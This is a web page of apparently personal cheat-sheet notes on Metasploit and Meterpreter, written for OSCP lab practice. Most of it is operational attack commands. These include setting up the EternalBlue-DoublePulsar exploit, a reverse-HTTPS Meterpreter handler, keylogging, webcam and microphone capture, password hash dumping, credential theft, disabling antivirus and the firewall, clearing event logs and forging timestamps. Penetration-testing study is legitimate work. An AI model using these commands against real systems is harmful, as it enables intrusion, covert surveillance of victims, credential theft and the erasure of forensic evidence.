<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Metasploit&meterpreter - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "metasploit\u0026amp;meterpreter", url: "#_top", children: [
              {title: "Experimenting with Meterpreter", url: "#experimenting-with-meterpreter" },
              {title: "Baisc system commands", url: "#baisc-system-commands" },
          ]},
          {title: "Common cmd commands", url: "#common-cmd-commands", children: [
          ]},
          {title: "Uictl switch keyboard / mouse", url: "#uictl-switch-keyboard-mouse", children: [
          ]},
          {title: "Execute executable file", url: "#execute-executable-file", children: [
          ]},
          {title: "-d Process name displayed during execution of the target host (for masquerading) -m Direct execution from memory", url: "#-d-process-name-displayed-during-execution-of-the-target-host-for-masquerading-m-direct-execution-from-memory", children: [
          ]},
          {title: "Migrate process migration", url: "#migrate-process-migration", children: [
          ]},
          {title: "Clearav clear log", url: "#clearav-clear-log", children: [
          ]},
          {title: "Timestomp forged timestamp", url: "#timestomp-forged-timestamp", children: [
          ]},
          {title: "Portfwd port forwarding", url: "#portfwd-port-forwarding", children: [
          ]},
          {title: "Autoroute add route", url: "#autoroute-add-route", children: [
          ]},
          {title: "Socks agent", url: "#socks-agent", children: [
          ]},
          {title: "Common script", url: "#common-script", children: [
          ]},
          {title: "Common crack module", url: "#common-crack-module", children: [
          ]},
          {title: "Keylogger", url: "#keylogger", children: [
          ]},
          {title: "Sniffer capture package", url: "#sniffer-capture-package", children: [
          ]},
          {title: "Webcam", url: "#webcam", children: [
          ]},
          {title: "Screen capture", url: "#screen-capture", children: [
          ]},
          {title: "Getgui command", url: "#getgui-command", children: [
              {title: "CORE COMMANDS", url: "#core-commands" },
              {title: "FILE SYSTEM COMMANDS", url: "#file-system-commands" },
              {title: "NETWORK COMMANDS", url: "#network-commands" },
              {title: "SYSTEM COMMANDS", url: "#system-commands" },
              {title: "User Interface Commands", url: "#user-interface-commands" },
              {title: "PRIVILAGE ESCALATION COMMANDS", url: "#privilage-escalation-commands" },
              {title: "PASSWORD DUMP COMMAND", url: "#password-dump-command" },
              {title: "TIMESTOMP COMMAND", url: "#timestomp-command" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h2 id="metasploitmeterpreter">metasploit&amp;meterpreter</h2>
<p>See <a href="https://www.offensive-security.com/metasploit-unleashed/"><em>Metasploit Unleashed Course</em></a></p>
<p>Search for exploits using Metasploit GitHub framework source code:
<a href="https://github.com/rapid7/metasploit-framework"><em>https://github.com/rapid7/metasploit-framework</em></a>
Translate them for use on OSCP LAB or EXAM.</p>
<p>Metasploit
MetaSploit requires Postfresql
<code>systemctl start postgresql</code></p>
<p>To enable Postgresql on startup
<code>systemctl enable postgresql</code></p>
<p>MSF Syntax
Start metasploit
<code>msfconsole</code>
<code>msfconsole -q</code></p>
<p>Show help for command
<code>show -h</code></p>
<p>Show Auxiliary modules
<code>show auxiliary</code></p>
<p>Use a module
<code>use auxiliary/scanner/snmp/snmp_enum
use auxiliary/scanner/http/webdav_scanner
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/ftp/ftp_login
use exploit/windows/pop3/seattlelab_pass</code></p>
<p>Show the basic information for a module
<code>info</code></p>
<p>Show the configuration parameters for a module
<code>show options</code></p>
<p>Set options for a module
<code>set RHOSTS 192.168.1.1-254
set THREADS 10</code></p>
<p>Run the module
<code>run</code></p>
<p>Execute an Exploit
<code>exploit</code></p>
<p>Search for a module
<code>search type:auxiliary login</code></p>
<p>Metasploit Database Access
Show all hosts discovered in the MSF database
<code>hosts</code></p>
<p>Scan for hosts and store them in the MSF database
<code>db_nmap</code></p>
<p>Search machines for specific ports in MSF database
<code>services -p 443</code></p>
<p>Leverage MSF database to scan SMB ports (auto-completed rhosts)
<code>services -p 443 --rhosts</code></p>
<p>You may find some boxes that are vulnerable to MS17-010 (AKA. EternalBlue).  Although, not offically part of the indended course, this exploit can be leveraged to gain SYSTEM level access to a Windows box.  I have never had much luck using the built in Metasploit EternalBlue module.  I found that the elevenpaths version works much more relabily. Here are the instructions to install it taken from the following <a href="https://www.youtube.com/watch?v=4OHLor9VaRI">YouTube video:</a></p>
<ol>
<li>First step is to configure the Kali to work with wine 32bit</li>
</ol>
<p><code>dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32
rm -r ~/.wine
wine cmd.exe
exit</code></p>
<ol>
<li>
<p>Download the exploit repostory
https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</p>
</li>
<li>
<p>Move the exploit to /usr /share /metasploit-framework /modules /exploits /windows /smb</p>
</li>
<li>
<p>Start metasploit console (spoolsv.exe as the PROCESSINJECT yielded results on OSCP boxes.)</p>
</li>
</ol>
<p><code>use exploit/windows/smb/eternalblue_doublepulsar
msf exploit(eternalblue_doublepulsar) &gt; set RHOST 10.10.10.10
RHOST =&gt; 10.11.1.73
msf exploit(eternalblue_doublepulsar) &gt; set PROCESSINJECT spoolsv.exe
PROCESSINJECT =&gt; spoolsv.exe
msf exploit(eternalblue_doublepulsar) &gt; run</code></p>
<h3 id="experimenting-with-meterpreter">Experimenting with Meterpreter</h3>
<p>Get system information from Meterpreter Shell
<code>sysinfo</code></p>
<p>Get user id from Meterpreter Shell
<code>getuid</code></p>
<p>Search for a file
<code>search -f *pass*.txt</code></p>
<p>Upload a file
<code>upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec</code></p>
<p>Download a file
<code>download c:\\Windows\\system32\\calc.exe /tmp/calc.exe</code></p>
<p>Invoke a command shell from Meterpreter Shell
<code>shell</code></p>
<p>Exit the meterpreter shell
<code>exit</code></p>
<p>Metasploit Exploit Multi Handler
multi/handler to accept an incoming reverse_https_meterpreter</p>
<p><code>payload
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST $ip
set LPORT 443
exploit
[*] Started HTTPS reverse handler on https://$ip:443/</code>
Building Your Own MSF Module
<code>mkdir -p ~/.msf4/modules/exploits/linux/misc
cd ~/.msf4/modules/exploits/linux/misc
cp
/usr/share/metasploitframework/modules/exploits/linux/misc/gld\_postfix.rb
./crossfire.rb
nano crossfire.rb</code></p>
<p>Post Exploitation with Metasploit - (available options depend on OS and Meterpreter Cababilities)
-   <code>download</code> Download a file or directory
<code>upload</code> Upload a file or directory
<code>portfwd</code> Forward a local port to a remote service
<code>route</code> View and modify the routing table
<code>keyscan_start</code> Start capturing keystrokes
<code>keyscan_stop</code> Stop capturing keystrokes
<code>screenshot</code> Grab a screenshot of the interactive desktop
<code>record_mic</code> Record audio from the default microphone for X seconds
<code>webcam_snap</code> Take a snapshot from the specified webcam
<code>getsystem</code> Attempt to elevate your privilege to that of local system.
<code>hashdump</code> Dumps the contents of the SAM database</p>
<hr />
<h3 id="baisc-system-commands">Baisc system commands</h3>
<p>background                  # placed in the background of the current session 
Sessions                    # Sessions to see -h help 
sessions -i <ID value>      # kill -k session into the session 
bgrun / RUN                 # implementation of the existing module, double-click the tab enter the run, has been                                   listed Some scripts 
info                        # View existing module information 
getuid                      # View current user identity 
getprivs                    # View current user permissions 
getpid                      # Get current process ID (PID) 
sysinfo                     # View target machine system information 
irb                         # Open ruby terminal 
ps                          # View is running Process   <br />
kill <PID value>            # Kill the specified PID process 
idletime                    # View target idle time 
reboot / shutdown           # Restart / Shutdown 
shell                       # Enter target cmd shell</p>
<h1 id="common-cmd-commands">Common cmd commands</h1>
<p>Whoami                    # Current privilege 
quser                     # Query current online administrator 
net user                  # View existing user 
net user username/password/add                      # Add user and corresponding password 
net localgroup User group name username/add         # Add the specified user to the specified user group 
netstat -ano              # Query the current network connection communication in the computer, LISTENING indicates                               that the port is in the listening state; ESTABLISHED indicates that the port is in the                               working (communication) state 
systeminfo                # View the details of the current computer 
tasklist /svc             # View each process corresponding to services 
taskkill / f / im program name                      # name of the end of a specified program 
taskkill / f / PID ID                               # end of a specified process PID 
tasklist | findstr "string"                         # Find content specified output 
logoff                                              # cancellation of a Specify the user's ID 
shutdown -r                                         # Restart the current computer 
netsh adcfirewall setAllprofiles state off          # Turn off the firewall</p>
<h1 id="uictl-switch-keyboard-mouse">Uictl switch keyboard / mouse</h1>
<p>Uictl [ enable/disable ]  [ keyboard/mouse/all ]   # enable or disable keyboard/mouse 
uictl disable mouse       # disable mouse 
uictl disable keyboard    # disable keyboard</p>
<h1 id="execute-executable-file">Execute executable file</h1>
<p>the Execute # executable file on the target machine 
execute -H -i -f cmd.exe create a new process cmd.exe #, -H invisible, -i interactive 
execute -H -m -d notepad.exe -f payload.exe - a "-o hack.txt" </p>
<h1 id="-d-process-name-displayed-during-execution-of-the-target-host-for-masquerading-m-direct-execution-from-memory">-d Process name displayed during execution of the target host (for masquerading) -m Direct execution from memory</h1>
<p>"-o hack.txt" is the running parameter of payload.exe</p>
<h1 id="migrate-process-migration">Migrate process migration</h1>
<p>Getpid          # Get the current process's pid 
ps              # View the current active process 
migrate <pid value>     # Migrate the Meterpreter session to the specified pid value in the process 
kill <pid value>        #kill the process</p>
<h1 id="clearav-clear-log">Clearav clear log</h1>
<p>Clearav   # Clear application logs, system logs, security logs in windows</p>
<h1 id="timestomp-forged-timestamp">Timestomp forged timestamp</h1>
<p>Timestomp C: \ -h  <br />
View help timestomp -v C: \ 2 .txt  <br />
View timestamp timestomp C: \ 2 .txt -f C: \ 1 .txt #Copy the timestamp of 1.txt Give 
2. txt timestomp c: \ test \ 22 .txt -z "03/10/2019 11:55:55" -v # Set the four properties to uniform time</p>
<h1 id="portfwd-port-forwarding">Portfwd port forwarding</h1>
<p>Portfwd add -l 1111 -p 3389 -r 127 .0.0.1 #Forward the 3389 port of the target machine to the local port 1111 
rdesktop 127 .0.0.1:1111 # Need to enter the username and password to connect 
rdesktop -u Administrator -p 123  127 .0.0.1:1111 # -u username -p password</p>
<h1 id="autoroute-add-route">Autoroute add route</h1>
<p>run autoroute -h # View help 
run get_local_subnets # View target intranet segment address 
run autoroute -s 192 .168.183.0/24   # Add target network segment route 
run autoroute -p   # View added route
run post/windows/gather/arp_scanner RHOSTS = 192 .168.183.0/24
run auxiliary/scanner/portscan/tcp RHOSTS = 192 .168.183.146 PORTS = 3389</p>
<h1 id="socks-agent">Socks agent</h1>
<p>Reference: https://www.freebuf.com/articles/network/125278.html
use auxiliary/server/socks4a
 set srvhost 127 .0.0.1
 set srvport 2000
run</p>
<h1 id="common-script">Common script</h1>
<p>Run arp_scanner -r 192 .168.183.1/24   # Use arp for surviving host scan 
run winenum   # automate some detection scripts 
run credcollect # get user hash 
run domain_list_gen   # get domain management account list 
run post/multi/gather/env   # get User environment variable 
run post/windows/gather/enum_logged_on_users -c   # List current login user 
run post/linux/gather/checkvm   # virtual machine 
run post/windows/gather/checkvm   # virtual machine 
run post/windows/gather/ Forensics/enum_drives   # View memory information 
run post/windows/gather/enum_applications   # Get installation software information 
run post/windows/gather/dumplinks    # Get recently accessed documents, link information 
run post/windows/gather/enum_ie  # Get IE cache 
run post/windows/gather/enum_firefox   # Get firefox cache 
run post/windows/gather/enum_chrome    # Get Chrome cache 
run post/multi/recon/local_exploit_suggester   # Get local privilege vulnerability 
run post/windows/gather/enum_patches   # Get patch information 
run post/windows/gather/enum_domain   # Find domain control 
run post/windows/gather/enum_snmp   # Get snmp community name 
run post/windows/gather/credentials/vnc   # Get vnc password 
run post/windows/wlan/ Wlan_profile   # Used to read the target host WiFi password 
run post/multi/gather/wlan_geolocate # Based on wlan, the location confirmation file is located at /root/.msf4/loot
run post/windows/manage/killav close antivirus software</p>
<h1 id="common-crack-module">Common crack module</h1>
<p>Auxiliary/scanner/mssql/mssql_login
Auxiliary/scanner/ftp/ftp_login
Auxiliary/scanner/ssh/ssh_login
Auxiliary/scanner/telnet/telnet_login
Auxiliary/scanner/smb/smb_login
Auxiliary/scanner/mssql/mssql_login
Auxiliary/scanner/mysql/mysql_login
Auxiliary/scanner/oracle/oracle_login
Auxiliary/scanner/postgres/postgres_login
Auxiliary/scanner/vnc/vnc_login
Auxiliary/scanner/pcanywhere/pcanywhere_login
Auxiliary/scanner/snmp/snmp_login
Auxiliary/scanner/ftp/anonymous</p>
<h1 id="keylogger">Keylogger</h1>
<p>Keyscan_start   # Start key record 
keyscan_dump    # Export record data 
keyscan_stop    # End key record</p>
<h1 id="sniffer-capture-package">Sniffer capture package</h1>
<p>Use sniffer
Sniffer_interfaces    # View NIC 
sniffer_start 1    # Select NIC 1 to start capturing 
sniffer_stats 1    # View NIC 1 status 
sniffer_dump 1 /tmp/wlan1.pcap   # Export pcap packet 
sniffer_stop 1    # Stop NIC 1 capture 
sniffer_release 1  # Release NIC 1 traffic</p>
<h1 id="webcam">Webcam</h1>
<p>record_mic　  # audio recording 
webcam_chat   # open a video chat (the other party pop) 
webcam_list   # view camera 
webcam_snap   # through the camera to take pictures 
webcam_stream   # open by video surveillance cameras (to monitor ≈ live as a web page)</p>
<h1 id="screen-capture">Screen capture</h1>
<p>Screenshot   # Screenshots 
use espia   # Use espia module 
screengrab   # screenshot</p>
<h1 id="getgui-command">Getgui command</h1>
<p>run getgui –h   # View help 
run getgui -e   # Open remote desktop 
run getgui -u admin -p admin   # Add user 
run getgui -f 6666 -e   # 3389 port forward to 6666</p>
<hr />
<h2 id="core-commands">CORE COMMANDS</h2>
<p>? - help menu
background - moves the current session to the background
bgkill - kills a background meterpreter script
bglist - provides a list of all running background scripts
bgrun - runs a script as a background thread
channel - displays active channels
close - closes a channel
exit - terminates a meterpreter session
help - help menu
interact - interacts with a channel
irb - go into Ruby scripting mode
migrate - moves the active process to a designated PID
quit - terminates the meterpreter session
read - reads the data from a channel
run - executes the meterpreter script designated after it
use - loads a meterpreter extension
write - writes data to a channel</p>
<h2 id="file-system-commands">FILE SYSTEM COMMANDS</h2>
<p>cat - read and output to stdout the contents of a file
cd - change directory on the victim
del - delete a file on the victim
download - download a file from the victim system to the attacker system
edit - edit a file with vim
getlwd - print the local directory
getwd - print working directory
lcd - change local directory
lpwd - print local directory
ls - list files in current directory
mkdir - make a directory on the victim system
pwd - print working directory
rm - delete a file
rmdir - remove directory on the victim system
upload - upload a file from the attacker system to the victim</p>
<h2 id="network-commands">NETWORK COMMANDS</h2>
<p>ipconfig - displays network interfaces with key information including IP address, etc.
portfwd - forwards a port on the victim system to a remote service
route - view or modify the victim routing table</p>
<h2 id="system-commands">SYSTEM COMMANDS</h2>
<p>clearav - clears the event logs on the victim's computer
drop_token - drops a stolen token
execute - executes a command
getpid - gets the current process ID (PID)
getprivs - gets as many privileges as possible
getuid - get the user that the server is running as
kill - terminate the process designated by the PID
ps - list running processes
reboot - reboots the victim computer
reg - interact with the victim's registry
rev2self - calls RevertToSelf() on the victim machine
shell - opens a command shell on the victim machine
shutdown - shuts down the victim's computer
steal_token - attempts to steal the token of a specified (PID) process
sysinfo - gets the details about the victim computer such as OS and name</p>
<h2 id="user-interface-commands">User Interface Commands</h2>
<p>enumdesktops - lists all accessible desktops
getdesktop - get the current meterpreter desktop
idletime - checks to see how long since the victim system has been idle
keyscan_dump - dumps the contents of the software keylogger
keyscan_start - starts the software keylogger when associated with a process such as Word or browser
keyscan_stop - stops the software keylogger
screenshot - grabs a screenshot of the meterpreter desktop
set_desktop - changes the meterpreter desktop
uictl - enables control of some of the user interface components</p>
<h2 id="privilage-escalation-commands">PRIVILAGE ESCALATION COMMANDS</h2>
<p>getsystem - uses 15 built-in methods to gain sysadmin privileges</p>
<h2 id="password-dump-command">PASSWORD DUMP COMMAND</h2>
<p>hashdump - grabs the hashes in the password (SAM) file</p>
<h2 id="timestomp-command">TIMESTOMP COMMAND</h2>
<p>timestomp - manipulates the modify, access, and create attributes of a file</p>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/metasploit&meterpreter.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>